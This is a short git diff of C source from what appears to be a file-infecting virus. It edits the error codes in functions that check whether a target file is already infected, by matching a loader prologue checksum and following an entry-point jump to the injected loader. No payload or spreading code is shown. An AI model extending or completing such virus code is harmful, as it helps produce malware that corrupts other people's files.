@@ -12,10 +12,10 @@ static bool	check_signature(struct safe_ptr ref, size_t offset, size_t size)
 	const uint8_t	*signature = safe(ref, offset, size);
 
 	if (signature == NULL)
-		return errors(ERR_VIRUS, _ERR_V_CANT_READ_SIGNATURE);
+		return errors(ERR_FILE, _ERR_F_READ_SIGNATURE, _ERR_T_CHECK_SIGNATURE);
 
 	if (checksum(signature, size) == LOADER_PROLOGUE_SUM)
-		return errors(ERR_VIRUS, _ERR_V_ALREADY_INFECTED);
+		return errors(ERR_VIRUS, _ERR_V_ALREADY_INFECTED, _ERR_T_CHECK_SIGNATURE);
 
 	return true;
 }
@@ -32,7 +32,7 @@ static bool	check_client_jump(struct safe_ptr file_ref, size_t entry_offset)
 	const void	*jump_destination = get_jmp32_destination(file_ref, jump_offset);
 
 	if (jump_destination == NULL)
-		return errors(ERR_THROW, _ERR_T_NOT_INFECTED_JUMP);
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_CHECK_CLIENT_JUMP);
 
 	const size_t	loader_offset = jump_destination - file_ref.ptr;
 
@@ -52,7 +52,7 @@ bool		not_infected(const struct entry *file_entry,
 
 	if (!check_loader_position(file_ref, loader_offset)
 	|| !check_client_jump(file_ref, entry_offset))
-		return errors(ERR_THROW, _ERR_T_NOT_INFECTED);
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_NOT_INFECTED);
 
 	return true;
 }
